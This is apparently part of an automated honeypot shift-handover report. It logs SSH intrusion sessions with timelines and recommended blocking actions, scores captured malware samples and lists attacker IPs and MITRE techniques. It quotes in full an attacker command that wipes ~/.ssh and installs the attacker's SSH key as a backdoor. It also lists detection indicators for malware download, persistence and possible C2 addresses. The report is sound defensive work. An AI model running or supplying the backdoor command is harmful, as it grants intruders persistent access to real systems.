| **First Seen** | 2026-10-21 00:32 |
| **Last Seen** | 2026-10-21 00:37 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:32:11` | `cowrie.session.connect` |
| `2026-10-21 00:32:13` | `cowrie.client.version` |
| `2026-10-21 00:32:13` | `cowrie.client.kex` |
| `2026-10-21 00:32:14` | `cowrie.login.success` |
| `2026-10-21 00:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.84[.]2` to AbuseIPDB if not already reported
- [ ] Block `120.48.84[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9096a999c3

| Field | Detail |
|---|---|
| **Source IP** | `186.122.177[.]140` |
| **First Seen** | 2026-10-21 00:32 |
| **Last Seen** | 2026-10-21 00:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:32:15` | `cowrie.session.connect` |
| `2026-10-21 00:32:15` | `cowrie.client.version` |
| `2026-10-21 00:32:15` | `cowrie.client.kex` |
| `2026-10-21 00:32:15` | `cowrie.login.success` |
| `2026-10-21 00:32:16` | `cowrie.session.params` |
| `2026-10-21 00:32:16` | `cowrie.command.input` |
| `2026-10-21 00:32:16` | `cowrie.command.failed` |
| `2026-10-21 00:32:17` | `cowrie.log.closed` |
| `2026-10-21 00:32:17` | `cowrie.session.params` |
| `2026-10-21 00:32:17` | `cowrie.command.input` |
| `2026-10-21 00:32:18` | `cowrie.session.file_download` |
| `2026-10-21 00:32:18` | `cowrie.log.closed` |
| `2026-10-21 00:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.122.177[.]140` to AbuseIPDB if not already reported
- [ ] Block `186.122.177[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88ce5186236

| Field | Detail |
|---|---|
| **Source IP** | `186.122.177[.]140` |
| **First Seen** | 2026-10-21 00:32 |
| **Last Seen** | 2026-10-21 00:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:32:18` | `cowrie.session.connect` |
| `2026-10-21 00:32:18` | `cowrie.client.version` |
| `2026-10-21 00:32:18` | `cowrie.client.kex` |
| `2026-10-21 00:32:19` | `cowrie.login.success` |
| `2026-10-21 00:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.122.177[.]140` to AbuseIPDB if not already reported
- [ ] Block `186.122.177[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b408b0e88a46

| Field | Detail |
|---|---|
| **Source IP** | `121.229.25[.]10` |
| **First Seen** | 2026-10-21 00:35 |
| **Last Seen** | 2026-10-21 00:40 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:35:10` | `cowrie.session.connect` |
| `2026-10-21 00:35:10` | `cowrie.client.version` |
| `2026-10-21 00:35:11` | `cowrie.client.kex` |
| `2026-10-21 00:35:12` | `cowrie.login.success` |
| `2026-10-21 00:35:13` | `cowrie.session.params` |
| `2026-10-21 00:35:13` | `cowrie.command.input` |
| `2026-10-21 00:35:13` | `cowrie.command.failed` |
| `2026-10-21 00:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.25[.]10` to AbuseIPDB if not already reported
- [ ] Block `121.229.25[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caaeba8255bb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-10-21 00:36 |
| **Last Seen** | 2026-10-21 00:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:36:24` | `cowrie.session.connect` |
| `2026-10-21 00:36:24` | `cowrie.client.version` |
| `2026-10-21 00:36:25` | `cowrie.client.kex` |
| `2026-10-21 00:36:25` | `cowrie.login.success` |
| `2026-10-21 00:36:26` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:36:27` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 00:36:27` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:36:28` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:36:28` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 00:36:28` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:36:30` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:36:30` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 00:36:30` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f0e4af77ce

| Field | Detail |
|---|---|
| **Source IP** | `108.174.147[.]36` |
| **First Seen** | 2026-10-21 00:37 |
| **Last Seen** | 2026-10-21 00:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:37:30` | `cowrie.session.connect` |
| `2026-10-21 00:37:30` | `cowrie.client.version` |
| `2026-10-21 00:37:30` | `cowrie.client.kex` |
| `2026-10-21 00:37:31` | `cowrie.login.success` |
| `2026-10-21 00:37:32` | `cowrie.session.params` |
| `2026-10-21 00:37:32` | `cowrie.command.input` |
| `2026-10-21 00:37:32` | `cowrie.command.failed` |
| `2026-10-21 00:37:32` | `cowrie.log.closed` |
| `2026-10-21 00:37:33` | `cowrie.session.params` |
| `2026-10-21 00:37:33` | `cowrie.command.input` |
| `2026-10-21 00:37:33` | `cowrie.session.file_download` |
| `2026-10-21 00:37:33` | `cowrie.log.closed` |
| `2026-10-21 00:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.147[.]36` to AbuseIPDB if not already reported
- [ ] Block `108.174.147[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eefd7a6257ba

| Field | Detail |
|---|---|
| **Source IP** | `108.174.147[.]36` |
| **First Seen** | 2026-10-21 00:37 |
| **Last Seen** | 2026-10-21 00:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:37:33` | `cowrie.session.connect` |
| `2026-10-21 00:37:33` | `cowrie.client.version` |
| `2026-10-21 00:37:33` | `cowrie.client.kex` |
| `2026-10-21 00:37:34` | `cowrie.login.success` |
| `2026-10-21 00:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.147[.]36` to AbuseIPDB if not already reported
- [ ] Block `108.174.147[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007c8cf47995

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-21 00:42 |
| **Last Seen** | 2026-10-21 00:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:42:46` | `cowrie.session.connect` |
| `2026-10-21 00:42:46` | `cowrie.client.version` |
| `2026-10-21 00:42:47` | `cowrie.client.kex` |
| `2026-10-21 00:42:47` | `cowrie.login.success` |
| `2026-10-21 00:42:47` | `cowrie.direct-tcpip.request` |
| `2026-10-21 00:42:47` | `cowrie.direct-tcpip.data` |
| `2026-10-21 00:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.190.126[.]68` | 1 | 2026-10-21 00:00 | 2026-10-21 00:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.92[.]141` | 1 | 2026-10-21 00:36 | 2026-10-21 00:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.84[.]2` | 1 | 2026-10-21 00:32 | 2026-10-21 00:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-21 00:31 | 2026-10-21 00:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]42` | 1 | 2026-10-21 00:53 | 2026-10-21 00:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-21 00:39 | 2026-10-21 00:39 | 32s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-21 00:24 | 2026-10-21 00:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.158.227[.]211` | 1 | 2026-10-21 00:35 | 2026-10-21 00:36 | 19s | 0 | `T1592` | 🟢 LOW |
| `222.97.112[.]179` | 1 | 2026-10-21 00:00 | 2026-10-21 00:00 | 33s | 0 | `T1592` | 🟢 LOW |
| `223.16.154[.]241` | 1 | 2026-10-21 00:53 | 2026-10-21 00:53 | 20s | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | 1 | 2026-10-21 00:12 | 2026-10-21 00:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.21.181[.]38` | 1 | 2026-10-21 00:31 | 2026-10-21 00:32 | 26s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-10-21 00:02 | 2026-10-21 00:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]223` | 1 | 2026-10-21 00:24 | 2026-10-21 00:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.237.204[.]44` | 1 | 2026-10-21 00:18 | 2026-10-21 00:18 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `2.57.122[.]238` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `27.156.154[.]3` | CN | Nind broadband network the | **100** ⚠️ | 50 |
| `103.211.76[.]8` | IN | Bharatnet Communications Private Limited | **100** ⚠️ | 12 |
| `154.83.16[.]14` | HK | Yisu Cloud Ltd | **100** ⚠️ | 39 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `80.94.95[.]118` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `218.158.227[.]211` | KR | Korea Telecom | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 41 cases |
| Tool 34  | Credential Extractor        | ✅ 238 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (9.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 22 priority case(s) shown individually · 15 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
